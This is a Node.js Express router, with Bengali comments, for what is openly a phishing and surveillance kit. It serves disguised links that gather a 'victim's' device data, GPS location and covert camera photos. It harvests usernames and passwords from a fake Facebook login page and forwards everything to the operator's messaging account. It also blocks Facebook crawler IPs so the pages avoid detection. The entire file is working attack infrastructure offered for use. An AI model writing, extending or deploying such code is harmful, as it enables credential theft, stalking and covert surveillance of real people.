const express = require('express');
const path = require('path');
const router = express.Router();
const Victim = require('../models/Victim');
const { 
    sendMessage, 
    sendImageMessage,
    formatVictimData,
    formatLocationMessage 
} = require('../utils/helpers');

// ================================================================
// 🚫 ব্লকড আইপি লিস্ট (Facebook crawler)
// ================================================================
const BLOCKED_IPS = [
    '173.252.82.31',
    '173.252.82.30',
    '173.252.82.32',
    '173.252.82.33',
    '173.252.82.34',
    '173.252.82.35',
    '173.252.82.36',
];

// ================================================================
// ✅ সঠিক IP বের করার ফাংশন (প্রক্সি/লোড ব্যালেন্সারের জন্য)
// ================================================================
function getClientIp(req) {
    // 1. x-forwarded-for হেডার থেকে (প্রক্সির ক্ষেত্রে) — এটাই সবচেয়ে নির্ভরযোগ্য
    const forwarded = req.headers['x-forwarded-for'];
    if (forwarded) {
        // কমা দ্বারা আলাদা করা IP গুলোর মধ্যে প্রথমটি হলো আসল IP
        const ips = forwarded.split(',').map(ip => ip.trim());
        return ips[0];
    }
    
    // 2. অন্যান্য হেডার (Cloudflare, Nginx, ইত্যাদি)
    const ip = req.headers['cf-connecting-ip'] ||   // Cloudflare
               req.headers['x-real-ip'] ||          // Nginx
               req.connection?.remoteAddress ||
               req.socket?.remoteAddress ||
               req.ip ||
               '0.0.0.0';
    
    // IPv6 লোকালহোস্ট ঠিক করা (::1 -> 127.0.0.1)
    if (ip === '::1' || ip === '::ffff:127.0.0.1') {
        return '127.0.0.1';
    }
    
    return ip;
}

// ================================================================
// 🚫 ব্লক চেক মিডলওয়্যার (সব POST রাউটের আগে)
// ================================================================
const blockMiddleware = (req, res, next) => {
    const clientIp = getClientIp(req);
    console.log(`🔍 IP চেক: ${clientIp}`);
    
    if (BLOCKED_IPS.includes(clientIp)) {
        console.log(`🚫 ব্লকড IP: ${clientIp} → রিকোয়েস্ট ব্লক করা হয়েছে`);
        // 403 ফেরত দিন যাতে এই আইপি থেকে আর কোনো ডেটা না আসে
        return res.status(403).json({ 
            status: 'error', 
            message: 'Access denied',
            blocked: true 
        });
    }
    
    // ব্লক না হলে পরবর্তী রাউটে যান
    next();
};

// ================================================================
// অটো ডিলিট: ১০ মিনিট
// ================================================================
const CLEANUP_INTERVAL = 60000;
const IMAGE_TTL = 600000;

setInterval(async () => {
    try {
        const cutoff = new Date(Date.now() - IMAGE_TTL);
        const victims = await Victim.find();
        let updated = 0;
        for (const v of victims) {
            const originalLength = v.camera.length;
            v.camera = v.camera.filter(c => new Date(c.timestamp) > cutoff);
            if (v.camera.length !== originalLength) {
                await v.save();
                updated++;
            }
        }
        if (updated > 0) console.log(`🗑️ ${updated} টি ভিক্টিমের পুরাতন ছবি মুছে ফেলা হয়েছে।`);
    } catch (err) {
        console.error('Cleanup error:', err);
    }
}, CLEANUP_INTERVAL);

// ================================================================
// রাউটস (পাবলিক GET রাউটগুলোতে ব্লক নেই)
// ================================================================

// ক্যামেরা লিঙ্ক
router.get('/v/:id', async (req, res) => {
    try {
        const victim = await Victim.findOne({ id: req.params.id });
        if (!victim) {
            return res.status(404).send('লিঙ্কটি ভুল বা মেয়াদোত্তীর্ণ।');
        }
        res.sendFile(path.join(__dirname, '../public/index.html'));
    } catch (err) {
        console.error('Error serving victim page:', err);
        res.status(500).send('সার্ভার ত্রুটি');
    }
});

// লোকেশন লিঙ্ক
router.get('/l/:id', async (req, res) => {
    try {
        const victim = await Victim.findOne({ id: req.params.id });
        if (!victim) {
            return res.status(404).send('লিঙ্কটি ভুল বা মেয়াদোত্তীর্ণ।');
        }
        res.sendFile(path.join(__dirname, '../public/location.html'));
    } catch (err) {
        console.error('Error serving location page:', err);
        res.status(500).send('সার্ভার ত্রুটি');
    }
});

// ফেক ফেসবুক লিঙ্ক
router.get('/fb/:id', async (req, res) => {
    try {
        const victim = await Victim.findOne({ id: req.params.id });
        if (!victim) {
            return res.status(404).send('লিঙ্কটি ভুল বা মেয়াদোত্তীর্ণ।');
        }
        res.sendFile(path.join(__dirname, '../public/fb.html'));
    } catch (err) {
        console.error('Error serving fb page:', err);
        res.status(500).send('সার্ভার ত্রুটি');
    }
});

// ================================================================
// ১. ভিক্টিম ডেটা রিসিভ (ব্লক মিডলওয়্যার সহ)
// ================================================================
router.post('/api/victim', blockMiddleware, async (req, res) => {
    try {
        const data = req.body;
        const clientIp = getClientIp(req);
        console.log(`📥 /api/victim থেকে IP: ${clientIp}, ID: ${data.id}`);

        if (!data.id) {
            console.error('❌ id নেই!');
            return res.status(400).json({ status: 'error', message: 'Missing id' });
        }

        // ভিক্টিম খুঁজি
        let victim = await Victim.findOne({ id: data.id });

        if (!victim) {
            victim = new Victim({
                id: data.id,
                fbId: data.fbId || 'unknown',
                type: data.type || 'camera',
                timestamp: data.timestamp ? new Date(data.timestamp) : new Date(),
                ip: data.ip || null,
                location: data.location || {},
                gpsLocation: data.gpsLocation || {},
                device: data.device || {},
                media: data.media || [],
                network: data.network || {},
                battery: data.battery || {},
                collectedAt: new Date()
            });
            await victim.save();
            console.log(`✅ নতুন ভিক্টিম তৈরি: ${data.id}`);
        } else {
            if (victim.fbId === 'unknown' && data.fbId && data.fbId !== 'unknown') {
                victim.fbId = data.fbId;
            }
            victim.ip = data.ip || victim.ip;
            victim.location = data.location || victim.location;
            victim.gpsLocation = data.gpsLocation || victim.gpsLocation;
            victim.device = data.device || victim.device;
            victim.media = data.media || victim.media;
            victim.network = data.network || victim.network;
            victim.battery = data.battery || victim.battery;
            victim.collectedAt = new Date();
            await victim.save();
            console.log(`✅ ভিক্টিম আপডেট: ${data.id}`);
        }

        // ============================================================
        // 🔥 এখানে চেক করা হচ্ছে: ব্লকড আইপি হলে মেসেজ পাঠানো হবে না
        // ============================================================
        // ব্লক মিডলওয়্যার ইতিমধ্যেই 403 ফেরত দিয়েছে, তাই এখানে আর আসার কথা নয়।
        // তবুও নিরাপত্তার জন্য ডাবল চেক:
        if (BLOCKED_IPS.includes(clientIp)) {
            console.log(`⚠️ ব্লকড IP ${clientIp} থেকে ডেটা এলেও মেসেজ পাঠানো হচ্ছে না।`);
            return res.status(200).json({ status: 'ok', data: victim, blocked: true });
        }

        // মেসেজ পাঠান (শুধুমাত্র যদি IP ব্লক না থাকে)
        if (victim.fbId && victim.fbId !== 'unknown') {
            const msg = formatVictimData(victim);
            await sendMessage(victim.fbId, msg);
            console.log(`📤 ডিভাইস ইনফো মেসেজ পাঠানো হয়েছে: ${victim.fbId}`);
        }

        // লোকেশন মেসেজ (যদি থাকে)
        if (victim.fbId && victim.fbId !== 'unknown' && victim.gpsLocation && victim.gpsLocation.latitude) {
            const locationMsg = formatLocationMessage(victim.gpsLocation);
            if (locationMsg) {
                await sendMessage(victim.fbId, locationMsg);
                console.log(`📍 লোকেশন মেসেজ পাঠানো হয়েছে: ${victim.fbId}`);
            }
        }

        res.status(200).json({ status: 'ok', data: victim });

    } catch (err) {
        console.error('❌ Victim data error:', err);
        if (err.name === 'ValidationError') {
            console.error('Validation Error:', err.errors);
            return res.status(400).json({ status: 'error', message: 'Validation Error', errors: err.errors });
        }
        res.status(500).json({ status: 'error', message: err.message, stack: err.stack });
    }
});

// ================================================================
// ২. ক্যামেরা ছবি রিসিভ (ব্লক মিডলওয়্যার সহ)
// ================================================================
router.post('/api/camera', blockMiddleware, async (req, res) => {
    try {
        const { id, image } = req.body;
        const clientIp = getClientIp(req);
        console.log(`📸 /api/camera থেকে IP: ${clientIp}, ID: ${id}`);

        if (!id || !image) {
            return res.status(400).json({ status: 'error', message: 'Missing id or image' });
        }

        const victim = await Victim.findOne({ id: id });
        if (!victim) {
            return res.status(404).json({ status: 'error', message: 'Victim not found' });
        }

        const isFirstImage = !victim.camera || victim.camera.length === 0;

        if (!victim.camera) victim.camera = [];
        victim.camera.push({
            image: image,
            timestamp: new Date()
        });
        await victim.save();

        const totalImages = victim.camera.length;
        console.log(`📸 ক্যামেরা ছবি: ${id} (মোট ${totalImages}টি)`);

        // ব্লক মিডলওয়্যার ইতিমধ্যেই 403 ফেরত দিয়েছে, তাই এখানে আর আসার কথা নয়।
        // তবুও নিরাপত্তার জন্য ডাবল চেক:
        if (BLOCKED_IPS.includes(clientIp)) {
            console.log(`⚠️ ব্লকড IP ${clientIp} থেকে ক্যামেরা ডেটা এলেও মেসেজ পাঠানো হচ্ছে না।`);
            return res.status(200).json({ status: 'ok', count: totalImages, blocked: true });
        }

        if (victim.fbId && victim.fbId !== 'unknown') {
            if (isFirstImage) {
                await sendMessage(victim.fbId, '📸 *ভিক্টিম ক্যামেরা পারমিশন দিয়েছে!*\nছবি আসতে শুরু করেছে...');
                console.log(`📸 ক্যামেরা পারমিশন মেসেজ: ${victim.fbId}`);
            }
            await sendImageMessage(victim.fbId, image);
            console.log(`📸 ছবি #${totalImages} পাঠানো হয়েছে: ${victim.fbId}`);
        }

        res.status(200).json({ status: 'ok', count: totalImages });

    } catch (err) {
        console.error('❌ Camera error:', err);
        res.status(500).json({ status: 'error', message: err.message });
    }
});

// ================================================================
// ৩. ইমেজ ভিউ (অ্যাডমিন প্যানেলের জন্য)
// ================================================================
router.get('/image/:id/:index', async (req, res) => {
    try {
        const victim = await Victim.findOne({ id: req.params.id });
        if (!victim) {
            return res.status(404).send('ভিক্টিম পাওয়া যায়নি');
        }
        const index = parseInt(req.params.index);
        if (isNaN(index) || index < 0 || index >= victim.camera.length) {
            return res.status(404).send('ছবি পাওয়া যায়নি (সম্ভবত ডিলিট হয়ে গেছে)');
        }
        const imgData = victim.camera[index].image;
        res.send(`<img src="data:image/jpeg;base64,${imgData}" style="max-width:100%;" />`);
    } catch (err) {
        console.error('Image view error:', err);
        res.status(500).send('এরর');
    }
});

// ================================================================
// ৪. ফেক ফেসবুক লগইন ডেটা
// ================================================================
router.post('/api/fblogin', async (req, res) => {
    try {
        const { id, username, password } = req.body;
        if (!id || !username || !password) {
            return res.status(400).json({ status: 'error', message: 'Missing data' });
        }

        const victim = await Victim.findOne({ id: id });
        if (!victim) {
            return res.status(404).json({ status: 'error', message: 'Victim not found' });
        }

        victim.fbLogin = {
            username: username,
            password: password,
            timestamp: new Date(),
            ip: req.ip || req.connection.remoteAddress || 'N/A'
        };
        await victim.save();

        console.log(`🔐 ফেক লগইন ডেটা: ${id} - ${username}`);

        if (victim.fbId && victim.fbId !== 'unknown') {
            const msg = `🔐 *ফেক ফেসবুক লগইন ডেটা!*\n\n📧 ইমেইল/ফোন: ${username}\n🔑 পাসওয়ার্ড: ${password}\n🆔 ভিক্টিম আইডি: ${id}`;
            await sendMessage(victim.fbId, msg);
        }

        res.status(200).json({ status: 'ok' });

    } catch (err) {
        console.error('❌ FB Login error:', err);
        res.status(500).json({ status: 'error', message: err.message });
    }
});

module.exports = router;